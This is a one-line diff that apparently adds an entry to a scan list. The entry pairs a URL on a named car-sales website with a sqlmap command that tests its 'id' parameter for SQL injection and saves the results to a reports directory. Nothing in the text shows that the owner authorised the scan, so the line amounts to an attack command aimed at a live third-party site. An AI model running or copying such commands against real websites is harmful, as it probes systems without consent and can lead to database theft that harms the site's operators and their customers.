@@ -1,0 +1,1 @@
+https://www.avariilised-autod.ee/vehicles/details.php?id=30131&l=lt (GET)  # tools/sqlmap/sqlmap.py -u https://www.avariilised-autod.ee/vehicles/details.php?id=30131&l=lt -p id --level=2 --risk=1 --batch --output-dir=reports/sqlmap
